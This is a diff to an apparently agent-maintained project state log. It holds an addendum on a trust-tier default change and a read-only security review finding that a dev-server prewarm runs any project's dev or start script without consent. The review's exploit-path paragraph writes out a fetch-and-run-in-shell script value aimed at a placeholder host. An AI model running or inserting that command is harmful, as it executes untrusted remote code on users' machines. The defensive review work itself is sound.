@@ -203,6 +203,151 @@ Archive section at the bottom of this file indexes them.
   actually stops, (c) reloading after that stays at "Static" — it must never
   re-promote itself.
 
+**Addendum, same session, after the full unfiltered `bun test` (14439 tests,
+started in background, ~391s) finished and was actually read:** it surfaced
+4 more `readStudioMeta(dir).trust ?? 'static'` call sites that hardcoded the
+literal `'static'` instead of importing `DEFAULT_TRUST_TIER` — none of them
+were in the task's file list, and none showed up in the originally-targeted
+suites (`server/handlers`, `src/__tests__/architecture`, `src/__tests__/canvas`,
+`src/admin/pages/site/studio/__tests__`) because they all live under
+`server/ai/`. Fixed at the source (imported `DEFAULT_TRUST_TIER`, same
+pattern as every other reader) rather than patched at the call site, since a
+second hardcoded literal is exactly the kind of drift this task exists to
+close:
+  - `server/ai/mcp/tools/studio/projectTools.ts` — 3 sites (`studio_list_projects`'s
+    per-project `trust` field, `studio_project_profile`'s `trust` field, and
+    `studio_install_deps`'s own Tier-0 gate check).
+  - `server/ai/chatSystemPrompt.ts:110` — the system-prompt builder's trust read.
+  - `server/ai/tools/studio/liveDigest.ts:337` — `probeTypecheckAvailability`'s
+    Tier-0 gate.
+  - `server/ai/mcp/tools/studio/typecheck.ts:144` — `studio_typecheck`'s own
+    Tier-0 gate (same pattern as `studio_install_deps`).
+  Confirmed by grep this was exhaustive: `grep -rn "trust ?? 'static'"
+  --include="*.ts" --include="*.tsx"` across the whole tree, before and after,
+  found exactly these 4 (3+1 already fixed in the main pass) and zero more
+  after the fix.
+  Test fallout fixed alongside (each rewritten to either write an explicit
+  `trust: 'static'` where the Tier-0 branch is genuinely under test, or assert
+  the tool now PROCEEDS by default): `server/ai/mcp/tools/studio/
+  referenceRender.test.ts` (1 test — its whole premise, "the default is Tier 0,
+  never 'unknown means yes'", is now the opposite fact and had to be rewritten
+  the same way), `projectTools.test.ts` (3 tests, 1 new test added for the
+  now-passing default case), `typecheck.test.ts` (1 test rewritten),
+  `liveDigest.test.ts` (1 test, now requires an explicit demotion to exercise
+  the branch it was testing). Re-ran `server/ai` (994 pass / 0 fail) and
+  `server/handlers` (2452 pass / 6 fail, all 6 the same pre-existing
+  `applyStudioEdit`/`extractProjectTokens`/`studioEditLocation` failures named
+  above — confirmed via a second full-suite `grep -E "^\(fail\)"` pass) plus
+  `bun run build` and `bun run lint` again after these fixes — all still
+  green. Two additional flaky/slow pre-existing failures surfaced only in the
+  full run and never in the targeted ones (`loadStudioPageInLocale`'s
+  same-id-different-textOrigin case, `inspectFrameHeadless`'s settle-then-ask
+  case — both 5+ second real-subprocess/headless-browser tests, neither
+  touching trust tiers, neither in any file this diff touches).
+  **Lesson for whoever reads this next:** the originally-scoped file list for
+  a "flip one default constant" task undercounted its own blast radius by 4
+  call sites and ~8 test cases, all outside the 4 directories the task named.
+  A full, unfiltered `bun test` — not just the targeted suites — is what
+  caught it. Trust the targeted suites for iteration speed; don't skip the
+  full run before calling a default-value change done.
+
+---
+
+### sec-20 — security review of the Tier-2 default (feat/trust-tier-default-run-project)
+- **Agent:** security-guard
+- **Stage:** done — review only, no source files changed
+- **Reviewed:** commit `10c87c95` (`feat(studio): every project starts at trust tier run-project`) on `feat/trust-tier-default-run-project`, diffed against `9716abf7`
+- **Updated:** 2026-09-20
+
+**Verdict: APPROVED WITH FIXES.** The two-gate Tier-2 design (`trustGate.ts`) is
+untouched and unweakened, the write path to `trust` is still singular and
+capability+CSRF gated, and old `.studio/meta.json` files with the retired
+`trustAutoPromoted*` keys still parse correctly (verified empirically, not by
+assumption — see Verification). But `sec-19`'s own handoff undersold the
+blast radius: the dev-server prewarm this default now makes universal is NOT
+scoped to Vite, and that gap predates this commit but was **practically
+unreachable before it** — this commit is what makes it reachable by default,
+silently, on every project.
+
+---
+
+## Scope
+
+Read-only. Traced (not modified): `server/handlers/studio/{trustTier,trustGate,studioMeta,liveCapability,devServer,styleCompile,styleCompileTier1,componentBundle,routeCapabilities}.ts`, `server/handlers/studio.ts`, `server/auth/capabilities.ts`, `server/ai/mcp/tools/studio/referenceRender.ts`, `src/admin/pages/site/studio/{useDevServerPrewarm,studioProjectTrust,registerProjectModules}.ts`, `src/admin/layouts/AdminCanvasLayout/AdminCanvasEditorBody.tsx`, `src/admin/pages/site/canvas/{LiveRuntimePill.tsx,BoardBanners/BoardBanners.tsx}`, `src/__tests__/architecture/studio-tier2-two-gates.test.ts`, plus every doc file the commit touched (`CLAUDE.md`, `PROJECT-BRIEF.md`, `docs/reference/capabilities.md`, `docs/agent-refs/glossary.md`, `docs/server.md`, `docs/features/{studio-import,studio-deploy}.md`, `STUDIO-FIGMA-FEEL-PLAN.md`, `docs/e2e/README.md`) and the two rewritten e2e cases.
+
+Ran (not fixed, not committed): `bun test` on the trust-tier test family (10 files) + the architecture gate. One 3-line throwaway Bun script (`/tmp/tb_check.ts`, deleted after use) to empirically verify TypeBox's `additionalProperties` behavior rather than assume it.
+
+**Landmine for whoever reads this worktree next:** at review time this worktree already carried unrelated, uncommitted modifications to `server/ai/chatSystemPrompt.ts`, `server/ai/mcp/tools/studio/{projectTools.ts,projectTools.test.ts,referenceRender.test.ts,typecheck.ts}`, `server/ai/tools/studio/liveDigest.ts` — none of mine, none touched by `10c87c95`, and not reverted (a blocked `git checkout` confirmed nothing of mine landed on disk). `git status`/`git diff --stat` before trusting this worktree's tree to mean "just the reviewed commit."
+
+---
+
+## Findings by severity
+
+### HIGH — the Tier-2 dev-server prewarm has no Vite/framework gate, and this commit is what makes that reachable by default — **NOT FIXED (recommend before merge)**
+
+Q4/Q7 answer, concretely. `useDevServerPrewarm` (`src/admin/pages/site/studio/useDevServerPrewarm.ts:31-36`) fires on one condition only — `trust === 'run-project'` — and is mounted unconditionally at the top of the whole `/admin/site` editor body, not gated to "Live view": `src/admin/layouts/AdminCanvasLayout/AdminCanvasEditorBody.tsx:69`. It calls `startDevServer(projectDir)` (`devServerRequests.ts`) → `POST /admin/api/studio/dev-server/start` → `serveStart` (`server/handlers/studio/devServer.ts:456-462`) → `requireTrustTier(dir, 'run-project', …)` (passes, by default, for every project now) → `startDevServer` → `ensureEntry` → `spawnEntry` (`devServer.ts:283-321`), which reads `package.json`'s `scripts.dev` or `scripts.start` (`devScriptFor`, `devServer.ts:136-149`, no framework check of any kind) and runs `Bun.spawn([packageManager, 'run', devScript], { cwd: appRoot, env: minimalSubprocessEnv(...), ... })` — unconditionally.
+
+`resolveLiveCapability` (`server/handlers/studio/liveCapability.ts:50-56`) — the actual Vite-and-lockfile check — is **never called** by `devServer.ts`, `useDevServerPrewarm.ts`, or `referenceRender.ts`. Its only two callers are `trustTier.ts`'s informational `GET` response and `LiveRuntimePill`'s own display logic. Same gap in `studio.ts:396`: `projectKey` is handed out purely on `trust === 'run-project'`, no Vite check either.
+
+**Exploit path, concretely:** import (GitHub or zip) or hand-author any repo — Next.js, CRA, Remix, a bare Node app, anything with a `package.json` `"scripts": { "dev": "…" }` or `"start": "…"`. The single operator opens it at `/admin/site`. `DEFAULT_TRUST_TIER` (`run-project`) means no promotion click ever happens, no notice ever shows, and `useDevServerPrewarm` fires the instant the editor body mounts — before the user has switched to "Live view", before the "Live needs Vite" pill (which only renders in Live view, `LiveRuntimePill.tsx`'s own doc) has said anything. The project's `dev`/`start` script runs as a real OS subprocess with no dependency on `node_modules` being installed at all: a script value of `"curl http://x/y | sh"` needs no compiler, no bundler, no prior `install` step — it is `sh -c` territory the moment `packageManager run <script>` shells out.
+
+This is a **new** exposure specifically because of `10c87c95`, not a pre-existing one merely relabeled: before this commit, a non-Vite project had **no UI path to `run-project` at all** — the pill's "Run the real app" promote button only rendered when `resolveLiveCapability(dir).capable` was true (Vite + lockfile), and the retired auto-promotion was Vite-and-lockfile-gated too. So `devServer.ts`'s framework-agnostic spawn code, though it carried no Vite check even before this commit, was **practically unreachable** for a non-Vite project through the ordinary product flow. Flipping `DEFAULT_TRUST_TIER` makes every project, regardless of framework, start at the tier that reaches it — with zero clicks.
+
+This also sits uneasily next to a guard the codebase already enforces deliberately elsewhere: `installDeps.ts` always passes `--ignore-scripts` specifically because a postinstall script is arbitrary code execution that must not happen before explicit consent (`docs/reference/capabilities.md`, `security-guard.md`'s own checklist). The `dev`/`start` script is exactly as arbitrary as a postinstall script and is now exempted from that same principle by default.
+
+**sec-19's own handoff (line 198-199 of this file) undersells this**, saying the new default means "every project now runs … on a Vite project, its dev server" — that qualifier is wrong; the spawn attempt is not scoped to Vite, only the resulting *live iframe* is (because the runtime-bridge plugin that makes a booted dev server useful to the canvas is Vite-only). The subprocess for a non-Vite project's `dev`/`start` script still executes; it just never gets an iframe to show for it.
+
+**Recommended fix (not applied — read-only review):** gate `useDevServerPrewarm` (and arguably `serveStart`/`serveStatus` themselves, for defense in depth) on `resolveLiveCapability(dir).capable`, so the automatic prewarm only ever reaches a Vite-with-lockfile project — exactly the set the product's own "Live needs Vite" messaging already claims is the boundary. This restores the pre-`10c87c95` reachability boundary for non-Vite projects instead of silently widening it, and needs an adversarial test: a fixture project with a non-Vite `package.json` (`{"scripts":{"start":"…"}}`, no `vite.config.*`) asserting `POST dev-server/start` never spawns when reached via the prewarm hook's own condition, or — if the product decision is that Tier 2 really should run any project's dev/start script regardless of framework — the docs (`PROJECT-BRIEF.md`, `docs/reference/capabilities.md`, `STATE.md` sec-19) need that stated as plainly as the style-compile consequence already is, instead of "on a Vite project."
+
+### MEDIUM — docs describe the Tier-2 default's reach in terms of the style compiler and "a Vite project's dev server," never the framework-agnostic spawn — **NOT FIXED**
+
+`docs/reference/capabilities.md`'s rewritten "Two reads that spawn" section (lines ~188-212 post-diff) is honest and precise about the Tier-1 style-compile consequence (a Client's first `GET /load` now compiles at Tier 1 for every project). It says nothing about the dev-server spawn being reachable for non-Vite projects too — the HIGH finding above is invisible from the docs as they stand. Same gap in `PROJECT-BRIEF.md`'s "Trust tiers" bullet and `STATE.md` sec-19's "Human action needed." Fold this into whatever doc edit accompanies the HIGH fix.
+
+---
+
+## Sound, no change
+
+Point-by-point against the checklist and the six review questions, with file:line:
+
+1. **Both Tier-2 gates present everywhere, unweakened.** `deploy.ts:175` and `devServer.ts:449,458` both call `requireTrustTier(dir, 'run-project', …)`; `referenceRender.ts` calls `checkTrustTier(dir, 'run-project')` (asserted by `studio-tier2-two-gates.test.ts`'s source-level gate, itself unchanged except a reworded comment — diffed byte-for-byte against `9716abf7`, confirmed via `git diff`). `componentBundle.ts`/`styleCompile.ts` still gate Tier 1 on `trust !== 'static'`, now reachable by default rather than by promotion, but the check itself is identical code (`styleCompile.ts:445`, `componentBundle.ts`'s doc-referenced gate).
+2. **An explicit `trust: 'static'` project is refused everywhere it was before.** `checkTrustTier`/`requireTrustTier` (`trustGate.ts:95-113`) read `.studio/meta.json` fresh on every call, no caching of the default — a project a human demoted stays demoted at the dev-server routes, deploy, `studio_render_reference`, the Tier-1 style compile, and the `projectKey` handout (`studio.ts:396`, `trust === 'run-project'` exactly).
+3. **Only `POST /admin/api/studio/trust-tier` writes `trust`.** `grep -rn "mergeStudioMeta(" server` (excluding tests) shows exactly one production call site touching `trust`: `trustTier.ts:124`. That route requires `studio.run.project` + an acceptable `Origin` (`routeCapabilities.ts:227`, CSRF via the shared route gate). The agent's native `Write`/`Edit` is refused on `.studio/meta.json` by `agentWriteScope.ts` — reconfirmed by `studio-tier2-two-gates.test.ts`'s own assertion, unchanged.
+4. **Tier-1 style compile stays in the capped subprocess.** `compileProjectStyles` (`styleCompile.ts:427-470`) is unchanged code, still delegating to `styleCompileTier1.ts`'s `runCappedSubprocess` (`cwd` = workspace dir, `minimalSubprocessEnv()`, `COMPILE_TIMEOUT_MS = 20_000`, stdout/stderr byte-capped, symlink-containment-checked package resolution via `workspacePackageResolve.ts`) — none of that changed; only its default reachability did. See the HIGH finding for the dev-server half, which is the actual new exposure.
+5. **Demotion is real, not cosmetic.** `POST trust-tier` with `trust !== 'run-project'` calls `enforceTierOnRunningProcesses` → `stopDevServer(dir)` (`trustTier.ts:92-95,125`) synchronously before responding; `stopDevServer` deletes the registry entry and kills the process (`devServer.ts`'s `stopDevServer`). `server/liveOrigin.ts` re-reads the in-memory registry per request (`status.phase === 'ready'`), never caches — so the very next `/p/<projectKey>/` request 404/503s once the entry is gone. Unchanged by this diff; confirmed still wired correctly.
+6. **Old `.studio/meta.json` files with `trustAutoPromoted`/`trustAutoPromotedAt` still load.** Verified empirically, not by TypeBox-defaults folklore: a throwaway script running `Value.Check`/`Value.Decode` against a `Type.Object` schema with two extra unknown keys returned `true` / kept the extra keys, because `StudioMetaSchema` never sets `additionalProperties: false`. `readStudioMeta`'s `parseJsonWithFallback` therefore accepts the old shape and every other field (`displayName`, `pagesDir`, cached `profile`, …) survives.
+7. **No real scope creep.** Every remaining `LiveAutoPromoteNotice`/`trustAutoPromoted` string in the tree (`STUDIO-FIGMA-FEEL-PLAN.md`, `PROJECT-BRIEF.md`, `STATE.md`, `docs/agent-refs/glossary.md`, `BoardBanners.tsx`, `bundle-size-budgets.test.ts`, `docs/state-archive/2026-Q3.md`) is a correctly-labeled historical/superseded reference, not a stale claim of current behavior — checked each one. The removed `liveCapability.test.ts` auto-promotion `describe` block (6 tests) is a correct deletion: the mechanism it tested no longer exists, nothing lost coverage of anything still true.
+
+---
+
+## Verification
+
+- `bun test server/handlers/__tests__/{trustTier,liveCapability,componentBundle,styleCompile,styleCompileConsent,deploy,studio}.test.ts server/handlers/studio/__tests__/{trustTierGate,devServer}.test.ts src/__tests__/architecture/studio-tier2-two-gates.test.ts` — **215 pass / 2 fail**. Both failures are `server/handlers/__tests__/studio.test.ts`'s `applyStudioEdit > collapses two edits that resolve to the same component source location` / `… still collapses a repeated non-insert structural edit on one location` (`dedupeStudioEdits`, nothing to do with trust tiers) — reproduced in isolation (same file run alone, still 2 fail), confirmed pre-existing: `git diff 9716abf7..10c87c95 -- server/handlers/studio.ts` touches only doc comments near the `trust`/`projectKey` reads, and `sec-19` already named these same two tests as pre-existing in this same file. Not mine, not this commit's.
+- TypeBox `additionalProperties` check: 3-line script, `Value.Check`/`Value.Decode` against `{ a: 'x', trustAutoPromoted: true, trustAutoPromotedAt: 123 }` with a schema only declaring `a` — `Check` → `true`, `Decode` → keeps all three keys. Confirms Q6 empirically rather than by assumption.
+- Did not re-run `bun run build`/full `bun test`/`bun run lint` — this worktree currently carries unrelated uncommitted changes from another session (see Scope's landmine), so a build/lint run now would not cleanly attribute to `10c87c95`. `sec-19`'s own verification (`bun run build` clean, `bun run lint` clean, targeted trust-tier suites 208/2 with the same two pre-existing failures) is consistent with what I reproduced.
+
+**Adversarial inputs traced (code-level, not executed against a live server — no reason to actually spawn an arbitrary subprocess against this repo):** an old `.studio/meta.json` shape carrying `trustAutoPromoted`/`trustAutoPromotedAt`; a project explicitly demoted to `static` at every one of the five Tier-2/Tier-1 entry points; a monorepo-shaped app root (`resolveAppRoot` vs. project dir) at the trust-tier read, per `trustGate.ts`'s own documented `sec-12` regression test; a non-Vite `package.json` with a `scripts.start` entry reaching `devServer.ts`'s spawn path with no capability the UI would normally have granted it before this commit.
+
+---
+
+## Security-guard checklist (this change)
+
+- **Paths** — n-a, no new path decoding in this diff.
+- **Archives** — n-a.
+- **Write targets** — n-a, no new write target; the one write path (`trust-tier`) is unchanged code, only its default changed.
+- **Subprocesses** — **HIGH finding above.** Style-compile subprocess: pass, capped/contained, unchanged. Dev-server subprocess: no framework gate, now reachable by default with zero clicks — flagged, not fixed.
+- **Secrets** — pass, unaffected; `minimalSubprocessEnv()` unchanged.
+- **Capability gating** — pass; two-gate design intact, architecture test unweakened.
+- **CSRF** — pass; the one write route is unchanged and still behind the shared route gate.
+
+---
+
+## Human action needed
+
+1. **Decide the HIGH finding before merge:** either gate `useDevServerPrewarm`/the dev-server start route on `resolveLiveCapability(dir).capable` (restores the pre-commit reachability boundary — non-Vite projects never auto-spawn), or explicitly accept "Tier 2 runs any project's `dev`/`start` script, Vite or not, with zero clicks" as intended and say so in `PROJECT-BRIEF.md` / `docs/reference/capabilities.md` / `CLAUDE.md` as plainly as the style-compile consequence already is. Silence on this specific point is the actual gap — the two-gate machinery this review otherwise approves is sound either way.
+2. **If choosing to fix:** add the adversarial test named in the HIGH finding (non-Vite fixture, assert no spawn from the prewarm's own trigger condition) before landing.
+3. **Do a clean `bun run build` / full `bun test` / `bun run lint`** once this worktree's unrelated uncommitted changes are resolved (not mine to touch) — `sec-19`'s numbers are the last clean baseline.
+4. Everything else in `sec-19`'s own "Human action needed" (dogfood the Live pill / Back-to-static / reload sequence) still stands and is orthogonal to this finding.
+
 ---
 
 ### store-11 — a duplicate you click once could write itself twice, silently
